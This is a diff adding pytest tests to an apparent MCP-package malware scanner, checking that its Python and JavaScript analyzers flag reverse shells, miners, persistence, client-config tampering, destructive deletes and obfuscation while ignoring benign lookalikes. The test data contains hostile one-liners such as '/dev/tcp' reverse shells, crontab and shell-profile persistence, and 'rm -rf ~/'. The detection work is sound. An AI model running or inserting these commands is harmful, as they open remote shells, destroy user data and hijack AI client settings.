@@ -16,7 +16,7 @@ import pytest
 from mcpiranha.core.models import Launch, Origin, ServerSnapshot, SourceHit, SourceTree
 from mcpiranha.core.pipeline import scan
 from mcpiranha.rules import load_rules
-from mcpiranha.source import archive_files, collect, local_entry, verify
+from mcpiranha.source import analyze_files, archive_files, collect, local_entry, verify
 from mcpiranha.source import javascript as js
 from mcpiranha.source import python as py
 
@@ -197,3 +197,106 @@ def test_rules() -> None:
     assert _found(("sensitive_file", "x")) == set()
     assert _found(("sensitive_file", "x"), ("exfil_host", "y")) == {"MCP-SRC-003", "MCP-SRC-005"}
     assert _found() == set()
+
+
+def test_oversized_files_are_skipped() -> None:
+    big = "var a = 1;\n" * (600 * 1024)  # over 5 MB
+    data = _tgz({"package/dist/huge.js": big, "package/index.js": "const ok = 1;"})
+    tree = analyze_files(archive_files(data, "pkg.tgz"), "npm:pkg@1.0.0")
+    assert tree.files == 1 and tree.skipped == ["dist/huge.js: larger than 5 MB"]
+
+
+def test_archive_bombs_stop_early(monkeypatch: pytest.MonkeyPatch) -> None:
+    import mcpiranha.source as source
+
+    monkeypatch.setattr(source, "MAX_UNPACKED", 100)
+    data = _tgz({"package/a.bin": "x" * 200, "package/index.js": "const ok = 1;"})
+    assert list(archive_files(data, "pkg.tgz")) == []  # gave up before reading the rest
+
+
+@pytest.mark.parametrize(
+    ("code", "kind"),
+    [
+        ("s = socket.socket(); os.dup2(s.fileno(), 0)", "reverse_shell"),
+        ("subprocess.run('bash -i >& /dev/tcp/192.0.2.1/4444 0>&1', shell=True)", "reverse_shell"),
+        ("POOL = 'stratum+tcp://pool.example.invalid:3333'", "miner"),
+        ("open(os.path.expanduser('~/.bashrc'), 'a').write(x)", "persistence"),
+        ("P = Path.home() / '.zshrc'\nP.write_text(x)", "persistence"),
+        ("os.system('(crontab -l; echo job) | crontab -')", "persistence"),
+        ("shutil.copy(src, Path.home() / 'Library/LaunchAgents/x.plist')", "persistence"),
+        ("Path(Path.home(), '.cursor/mcp.json').write_text(cfg)", "client_config"),
+        ("shutil.rmtree(Path.home())", "destructive"),
+        ("os.system('rm -rf ~/')", "destructive"),
+        ("exec(marshal.loads(blob))", "dynamic_code"),
+        ("__pyarmor__(__name__, __file__, b'...')", "obfuscated"),
+    ],
+)
+def test_python_detects_malware_behaviors(code: str, kind: str) -> None:
+    assert kind in _kinds(py.analyze("m.py", code))
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        "DENY = ['rm -rf /', 'bash -i >& /dev/tcp/']",  # deny-lists (calibration)
+        "print(open(os.path.expanduser('~/.zshrc')).read())",  # reading a profile
+        "cfg = json.loads((Path.home() / '.cursor/mcp.json').read_text())",  # reading a config
+        "shutil.rmtree(build_dir)",
+        "os.system('rm -rf ./dist')",
+        "HELP = 'Run crontab -l to list your jobs.'",  # prose; crontab -l only lists
+    ],
+)
+def test_python_ignores_benign_lookalikes(code: str) -> None:
+    assert py.analyze("m.py", code) == []
+
+
+@pytest.mark.parametrize(
+    ("code", "kind"),
+    [
+        ("const sh = spawn('/bin/sh', []); const c = new net.Socket();", "reverse_shell"),
+        ("execSync(`bash -i >& /dev/tcp/${h}/4444 0>&1`);", "reverse_shell"),
+        ("spawn('./xmrig', ['--donate-level', '1']);", "miner"),
+        ("fs.appendFileSync(path.join(os.homedir(), '.bashrc'), line);", "persistence"),
+        ("exec(\"(crontab -l; echo '* * * * * x') | crontab -\");", "persistence"),
+        (
+            "const C = path.join(os.homedir(), '.cursor/mcp.json'); fs.writeFileSync(C, s);",
+            "client_config",
+        ),
+        ("fs.rmSync(os.homedir(), { recursive: true, force: true });", "destructive"),
+        ("execSync('rm -rf ~/');", "destructive"),
+    ],
+)
+def test_javascript_detects_malware_behaviors(code: str, kind: str) -> None:
+    assert kind in _kinds(js.analyze("m.js", code.encode()))
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        "const BLOCKED = ['rm -rf /', 'bash -i >& /dev/tcp/'];",
+        "const rc = fs.readFileSync(path.join(os.homedir(), '.zshrc'), 'utf8');",
+        "const cfg = JSON.parse(fs.readFileSync(path.join(os.homedir(), '.cursor/mcp.json')));",
+        "const p = spawn('node', ['server.js']);",
+        "fs.rmSync(outDir, { recursive: true });",
+        "console.error(`schtasks /Create failed (${reason})`);",  # an error message (comfyui)
+    ],
+)
+def test_javascript_ignores_benign_lookalikes(code: str) -> None:
+    assert js.analyze("m.js", code.encode()) == []
+
+
+def test_obfuscator_output_is_flagged_but_minified_code_is_not() -> None:
+    obfuscated = ";".join(f"var _0x{0x1A2B + i:04x}=1" for i in range(60))
+    assert _kinds(js.analyze("m.js", obfuscated.encode())) == {"obfuscated"}
+    minified = ";".join(f"var a{i}=1" for i in range(60))
+    assert js.analyze("m.js", minified.encode()) == []
+
+
+def test_client_config_writes_are_low_unless_they_auto_approve() -> None:
+    plain = "fs.writeFileSync(path.join(os.homedir(), '.cursor/mcp.json'), s);"
+    approving = plain + " const entry = { command: 'x', autoApprove: ['*'] };"
+    for code, severity in ((plain, "low"), (approving, "high")):
+        tree = analyze_files(iter([("i.js", code.encode())]), "npm:pkg@1.0.0")
+        snapshot = _snapshot("npx", "-y", "pkg").model_copy(update={"source": tree})
+        [finding] = scan([snapshot], SRC_RULES).findings
+        assert (finding.rule_id, finding.severity.value) == ("MCP-SRC-009", severity)
